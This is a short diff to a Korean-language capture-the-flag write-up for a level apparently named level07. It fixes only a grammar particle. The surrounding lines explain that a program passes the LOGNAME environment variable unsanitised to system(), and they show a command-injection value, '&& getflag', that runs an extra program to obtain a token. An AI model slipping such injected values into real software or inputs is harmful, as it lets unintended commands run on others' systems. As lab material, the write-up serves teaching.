@@ -31,7 +31,7 @@ asprintf(buf, "/env/echo %s", s);
 system(buf);
 ```
 
-따라서 환경 변수 `LOGNAME`를 `&& getflag` 과 같이 변경하면 `getflag` 프로그램이 실행되며 `token`을 획득할 수 있다.
+따라서 환경 변수 `LOGNAME`를 `&& getflag`와 같이 변경하면 `getflag` 프로그램이 실행되며 `token`을 획득할 수 있다.
 
 ```bash
 $ LOGNAME='&& getflag' ./level07
